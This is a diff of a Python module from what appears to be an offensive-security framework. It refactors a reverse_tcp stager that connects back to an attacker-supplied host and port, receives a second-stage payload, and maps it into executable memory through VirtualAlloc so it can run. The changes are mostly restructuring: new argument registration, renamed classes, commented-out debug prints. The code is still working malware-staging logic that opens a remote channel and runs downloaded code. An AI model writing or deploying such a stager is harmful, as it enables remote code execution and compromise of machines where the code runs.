@@ -1,4 +1,4 @@
-import utils.arg
+#import utils.arg
 from utils.helper import nstate as nstate
 from time import sleep
 import ctypes.wintypes
@@ -8,11 +8,20 @@ import socket
 import struct
 import ctypes
 
-class stager():
+CATEGORY = 'stager'
+
+def register_arguments(parser):
+    parser.add_argument('-a', '--arch', choices=['x64', 'x86'], default='x64', type=str, help= 'Architecture to use, x64 is the default')
+    parser.add_argument('-p', '--port', default=4444, type=int, required=True, help='Remote port to connect to')
+    parser.add_argument('-r', '--remote-host', type=str, required=True, help='Remote host to connect to')
+    parser.add_argument('-s', '--sleep', default=0, type=int, required=True, help='Sleep for x seconds before the stage is executed')
+    parser.add_argument('-t', '--timeout', default=30, type=int, help='Connect timeout in seconds, 30 seconds is the default')
+
+class stage():
     
     Author = 'raptor@0xdeadbeef.info, psycore8'
     Description = 'Connect back (reverse_tcp) to remote host and receive a stage'
-    Version = '0.0.3'
+    Version = '1.0.0'
     payload = any
     sock = any
 
@@ -23,17 +32,17 @@ class stager():
         self.architecture = architecture
         self.sleeptime = sleeptime
 
-    def init():
-        spName = 'msfstager'
-        # flag, name, choices=, action=, default=, type, required, help)
-        spArgList = [
-            ['-a', '--arch', ['x64', 'x86'], None, 'x64', str, False, 'Architecture to use, x64 is the default'],
-            ['-p', '--port', None, None, 4444, int, True, 'Remote port to connect to'],
-            ['-r', '--remote-host', None, None, None, str, True, 'Remote host to connect to'],
-            ['-s', '--sleep', None, None, 0, int, True, 'Sleep for x seconds before the stage is executed'],
-            ['-t', '--timeout', None, None, 30, int, False, 'Connect timeout in seconds, 30 seconds is the default']
-        ]
-        utils.arg.CreateSubParserEx(spName, stager.Description, spArgList)
+    # def init():
+    #     spName = 'meterpreter-stage'
+    #     # flag, name, choices=, action=, default=, type, required, help)
+    #     spArgList = [
+    #         ['-a', '--arch', ['x64', 'x86'], None, 'x64', str, False, 'Architecture to use, x64 is the default'],
+    #         ['-p', '--port', None, None, 4444, int, True, 'Remote port to connect to'],
+    #         ['-r', '--remote-host', None, None, None, str, True, 'Remote host to connect to'],
+    #         ['-s', '--sleep', None, None, 0, int, True, 'Sleep for x seconds before the stage is executed'],
+    #         ['-t', '--timeout', None, None, 30, int, False, 'Connect timeout in seconds, 30 seconds is the default']
+    #     ]
+    #     utils.arg.CreateSubParserEx(spName, stage.Description, spArgList)
 
     def CreateSocket(self):
         print(f'{nstate.OKBLUE} Creating Socket...')
@@ -97,8 +106,8 @@ class stager():
 
         ptr = VirtualAlloc(0, len(self.payload), MEM_COMMIT_RESERVE, PAGE_READWRITE_EXECUTE)
 
-        print(f'Pointer: {ptr}')
-        print(f'{len(self.payload)}')
+        #print(f'Pointer: {ptr}')
+        #print(f'{len(self.payload)}')
         if ptr:
             print(f'{nstate.OKGREEN} Memory allocated!')
             buf = (ctypes.c_char * len(self.payload)).from_buffer(self.payload)
